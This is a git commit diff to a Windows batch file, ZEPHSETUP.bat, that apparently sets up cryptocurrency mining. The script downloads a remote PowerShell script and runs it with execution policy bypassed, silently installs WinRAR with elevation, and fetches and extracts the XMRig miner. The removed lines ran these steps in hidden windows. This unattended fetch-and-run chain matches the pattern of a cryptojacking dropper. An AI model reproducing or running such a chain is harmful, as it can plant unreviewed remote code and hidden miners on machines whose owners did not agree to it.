d4ef983e7d70fd56655b01a7665f53937b1df211
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-05 18:20:34 +0700

    ZEPHSETUP.bat

--- ZEPHSETUP.bat
+++ ZEPHSETUP.bat
@@ -1,6 +1,6 @@
-Start-Process powershell.exe  "Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1 -OutFile C:\configure_system.ps1" -WindowStyle Hidden
-Start-Process powershell.exe -ExecutionPolicy Bypass -File "C:\configure_system.ps1" -WindowStyle Hidden
-Start-Process powershell.exe  "Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'" -WindowStyle Hidden
+powershell.exe  "Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1 -OutFile C:\configure_system.ps1"
+powershell.exe -ExecutionPolicy Bypass -File "C:\configure_system.ps1"
+powershell.exe  "Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'"
 powershell.exe  "Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs"
 powershell.exe  "Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\xmrig-6.22.2-gcc-win64.zip"
 powershell.exe  "& 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\xmrig-6.22.2-gcc-win64.zip' 'C:\'"
